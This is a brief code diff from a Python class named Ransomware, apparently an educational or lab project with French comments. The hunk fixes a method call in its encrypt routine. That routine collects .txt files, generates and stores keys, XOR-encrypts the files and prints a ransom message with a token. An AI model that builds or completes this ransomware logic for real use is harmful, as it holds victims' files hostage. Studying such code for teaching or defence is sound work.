@@ -42,7 +42,7 @@ class Ransomware:
 
     def encrypt(self):
         secret_manager = SecretManager()
-        files = self.get("*.txt")
+        files = self.get_files("*.txt")
         secret_manager.setup() #génération et stockage des clés
         secret_manager.xorfiles(files) #chiffrement
         print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
